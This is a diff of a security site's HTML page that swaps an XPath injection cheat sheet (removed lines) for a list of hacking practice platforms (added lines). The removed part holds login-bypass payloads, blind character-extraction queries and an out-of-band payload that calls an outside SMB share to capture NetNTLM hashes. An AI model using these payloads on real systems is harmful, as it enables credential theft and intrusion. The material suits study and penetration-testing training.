@@ -3,15 +3,15 @@
 <head>
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="All about XPATH injection techniques, methods, payloads, how/why/when they work.">
+<meta name="description" content="Places to practice and learn network security. Vulnerable configs, virtual machines, containers, etc..">
 <meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="XPATH Injection" />
-<meta property="og:description" content="All about XPATH injection techniques, methods, payloads, how/why/when they work." />
+<meta name="color-scheme" content="light dark"><meta property="og:title" content="Training Grounds" />
+<meta property="og:description" content="Places to practice and learn network security. Vulnerable configs, virtual machines, containers, etc.." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/xpath_injection/" /><meta property="article:section" content="docs" />
-<meta property="article:published_time" content="2022-10-16T00:00:00+00:00" />
-<meta property="article:modified_time" content="2022-12-10T11:35:25-05:00" />
-<title>XPATH Injection | Gray Hat Freelancing</title>
+<meta property="og:url" content="https://www.grayhatfreelancing.com/docs/training_grounds/" /><meta property="article:section" content="docs" />
+<meta property="article:published_time" content="2023-01-15T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-01-15T07:58:11-05:00" />
+<title>Training Grounds | Gray Hat Freelancing</title>
 <link rel="manifest" href="/manifest.json">
 <link rel="icon" href="/favicon.png" type="image/x-icon">
 <link rel="stylesheet" href="/book.min.4b35fed0bea034bbc19c89c71e14b73fb9c68cfcc586b9382adfb9b7b103ba06.css" integrity="sha256-SzX&#43;0L6gNLvBnInHHhS3P7nGjPzFhrk4Kt&#43;5t7EDugY=" crossorigin="anonymous">
@@ -136,7 +136,7 @@ https://github.com/alex-shpak/hugo-book
   
 
   
-    <a href="/docs/training_grounds/" class="">Training Grounds</a>
+    <a href="/docs/training_grounds/" class="active">Training Grounds</a>
   
 
         </li>
@@ -1033,7 +1033,7 @@ https://github.com/alex-shpak/hugo-book
   
 
   
-    <a href="/docs/xpath_injection/" class="active">XPATH Injection</a>
+    <a href="/docs/xpath_injection/" class="">XPATH Injection</a>
   
 
         </li>
@@ -1125,7 +1125,7 @@ https://github.com/alex-shpak/hugo-book
     <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>XPATH Injection</strong>
+  <strong>Training Grounds</strong>
 
   <label for="toc-control">
     
@@ -1141,13 +1141,9 @@ https://github.com/alex-shpak/hugo-book
   
 <nav id="TableOfContents">
   <ul>
-    <li><a href="#xpath-injection">XPATH injection</a>
+    <li><a href="#training-grounds">Training Grounds</a>
       <ul>
-        <li><a href="#exploitation">Exploitation</a></li>
-        <li><a href="#blind-exploitation">Blind Exploitation</a></li>
-        <li><a href="#out-of-band-exploitation">Out Of Band Exploitation</a></li>
-        <li><a href="#tools">Tools</a></li>
-        <li><a href="#references">References</a></li>
+        <li><a href="#online-websites-and-communities">Online Websites and Communities</a></li>
       </ul>
     </li>
   </ul>
@@ -1162,71 +1158,37 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="xpath-injection">
-  XPATH injection
-  <a class="anchor" href="#xpath-injection">#</a>
+  <article class="markdown"><h1 id="training-grounds">
+  Training Grounds
+  <a class="anchor" href="#training-grounds">#</a>
 </h1>
-<blockquote>
-<p>XPath Injection is an attack technique used to exploit applications that construct XPath (XML Path Language) queries from user-supplied input to query or navigate XML documents.</p>
-</blockquote>
-<h2 id="exploitation">
-  Exploitation
-  <a class="anchor" href="#exploitation">#</a>
+<h2 id="online-websites-and-communities">
+  Online Websites and Communities
+  <a class="anchor" href="#online-websites-and-communities">#</a>
 </h2>
-<p>Similar to SQL : <code>&quot;string(//user[name/text()='&quot; +vuln_var1+ &quot;' and password/text()=’&quot; +vuln_var1+ &quot;']/account/text())&quot;</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#e6db74">&#39; or &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; or &#39;&#39;=&#39;</span>
-</span></span><span style="display:flex;"><span>x<span style="color:#e6db74">&#39; or 1=1 or &#39;</span>x<span style="color:#e6db74">&#39;=&#39;</span>y
-</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">//</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">/</span><span style="color:#75715e">/*
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">*/</span><span style="color:#f92672">*</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">@*</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">count</span>(<span style="color:#f92672">/</span>child::node())
-</span></span><span style="display:flex;"><span>x<span style="color:#e6db74">&#39; or name()=&#39;</span>username<span style="color:#e6db74">&#39; or &#39;</span>x<span style="color:#e6db74">&#39;=&#39;</span>y
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; and count(/*)=1 and &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; and count(/@*)=1 and &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39; and count(/comment())=1 and &#39;</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">&#39;=&#39;</span><span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">search</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;)] | //user/*[contains(*,&#39;</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">search</span><span style="color:#f92672">=</span>Har<span style="color:#e6db74">&#39;) and contains(../password,&#39;</span><span style="color:#66d9ef">c</span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">search</span><span style="color:#f92672">=</span>Har<span style="color:#e6db74">&#39;) and starts-with(../password,&#39;</span><span style="color:#66d9ef">c</span>
-</span></span></code></pre></div><h2 id="blind-exploitation">
-  Blind Exploitation
-  <a class="anchor" href="#blind-exploitation">#</a>
-</h2>
-<ol>
-<li>Size of a string
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">and</span> string<span style="color:#f92672">-</span><span style="color:#66d9ef">length</span>(account)<span style="color:#f92672">=</span>SIZE_INT
-</span></span></code></pre></div></li>
-<li>Extract a character
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">substring</span>(<span style="color:#f92672">//</span><span style="color:#66d9ef">user</span>[userid<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>]<span style="color:#f92672">/</span>username,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">1</span>)<span style="color:#f92672">=</span>CHAR_HERE
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">substring</span>(<span style="color:#f92672">//</span><span style="color:#66d9ef">user</span>[userid<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>]<span style="color:#f92672">/</span>username,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">1</span>)<span style="color:#f92672">=</span>codepoints<span style="color:#f92672">-</span><span style="color:#66d9ef">to</span><span style="color:#f92672">-</span>string(INT_ORD_CHAR_HERE)
-</span></span></code></pre></div></li>
-</ol>
-<h2 id="out-of-band-exploitation">
-  Out Of Band Exploitation
-  <a class="anchor" href="#out-of-band-exploitation">#</a>
-</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>http<span style="color:#960050;background-color:#1e0010">:</span>//example.com/<span style="color:#66d9ef">?</span>title=Foundation&amp;type=*&amp;rent_days=* and doc(<span style="color:#e6db74">&#39;//10.10.10.10/SHARE&#39;</span>)
-</span></span></code></pre></div><h2 id="tools">
-  Tools
-  <a class="anchor" href="#tools">#</a>
-</h2>
-<ul>
-<li><a href="https://github.com/orf/xcat">xcat</a> - Automate XPath injection attacks to retrieve documents</li>
-<li><a href="https://github.com/feakk/xxxpwn">xxxpwn</a> - Advanced XPath Injection Tool</li>
-<li><a href="https://github.com/aayla-secura/xxxpwn_smart">xxxpwn_smart</a> - A fork of xxxpwn using predictive text</li>
-<li><a href="https://github.com/micsoftvn/xpath-blind-explorer">xpath-blind-explorer</a></li>
-<li><a href="https://github.com/Harshal35/XMLCHOR">XmlChor</a> - Xpath injection exploitation tool</li>
-</ul>
-<h2 id="references">
-  References
-  <a class="anchor" href="#references">#</a>
-</h2>
-<ul>
-<li><a href="https://www.owasp.org/index.php/Testing_for_XPath_Injection_%28OTG-INPVAL-010%29">OWASP XPATH Injection</a></li>
-<li><a href="https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/">Places of Interest in Stealing NetNTLM Hashes - Osanda Malith Jayathissa - March 24, 2017</a></li>
-</ul>
+<p><a href="https://www.hackthebox.eu/">HackTheBox.EU</a> &amp; <a href="https://academy.hackthebox.eu/catalogue">HTB Catalogue</a>
+Hackthebox has online machines to hack, it&rsquo;s a pretty solid training ground, I personally lean towards TryHackMe. But, you should practie everywhere and often. Try learning by doing retired machines following Ippsec videos.
+HackTheBox Academy is connected to HackerOne.</p>
+<p><a href="https://tryhackme.com/">TryHackMe</a>
+Tryhackme is another formidable learning platform. Some rooms are simply walkthroughs where you can read, learn and basically just type what they tell you, other rooms require some self-study to complete and there&rsquo;s also challenge rooms, CTFs and King of the Hill competition mode!</p>
+<p><a href="https://www.root-me.org/">RootMe</a>
+Rootme is another resource for online hosted virtual machines to hack.</p>
+<p><a href="https://www.vulnhub.com/">VulnHub</a>
+Vulnhub has virtual machine images you can download and then try to hack.</p>
+<p><a href="https://hack.me/">hack.me</a>
+This site seems to be a community platform</p>
+<p><a href="https://www.hacker101.com/">Hacker101</a>
+free site with videos and CTFs</p>
+<p><a href="https://crackmes.one/">CrackMes</a>
+This site has a lot of binaries for forensic learning.</p>
+<p><a href="https://www.hackthissite.org/missions/basic/">HackThisSite</a>
+HackThisSite has been around for a very long time and has a lot of challenges to test your skill sets.</p>
+<p><a href="https://attackdefense.com/">AttackDefense</a>
+AttackDefense launched in the last few years and has a lot of online resources for practicing and learning.</p>
+<p><a href="https://portswigger.net/web-security/dashboard">PortSwigger</a>
+PortSwigger is the creator of the awesome BurpSuite proxy tool (and more), it has labs for you to learn and practice on.</p>
+<p><a href="https://www.hackerrank.com">HackerRank</a>
+HackerRank is a good site for keeping your coding skills fresh.</p>
 </article>
  
       
@@ -1236,9 +1198,9 @@ https://github.com/alex-shpak/hugo-book
   <div class="flex flex-wrap justify-between">
 
 
-  <div><a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/commit/3579e9c4ae7712d4e8fcdd17b931224d3fca8a8d" title='Last modified by Stuart Gray | December 10, 2022' target="_blank" rel="noopener">
+  <div><a class="flex align-center" href="https://github.com/m00tiny/grayhatfreelancing/commit/22acdab73cf1661b8b6a9f15892afa9b3495afc0" title='Last modified by Stuart Gray | January 15, 2023' target="_blank" rel="noopener">
       <img src="/svg/calendar.svg" class="book-icon" alt="Calendar" />
-      <span>December 10, 2022</span>
+      <span>January 15, 2023</span>
     </a>
   </div>
 
@@ -1270,13 +1232,9 @@ https://github.com/alex-shpak/hugo-book
   
 <nav id="TableOfContents">
   <ul>
-    <li><a href="#xpath-injection">XPATH injection</a>
+    <li><a href="#training-grounds">Training Grounds</a>
       <ul>
-        <li><a href="#exploitation">Exploitation</a></li>
-        <li><a href="#blind-exploitation">Blind Exploitation</a></li>
-        <li><a href="#out-of-band-exploitation">Out Of Band Exploitation</a></li>
-        <li><a href="#tools">Tools</a></li>
-        <li><a href="#references">References</a></li>
+        <li><a href="#online-websites-and-communities">Online Websites and Communities</a></li>
       </ul>
     </li>
   </ul>
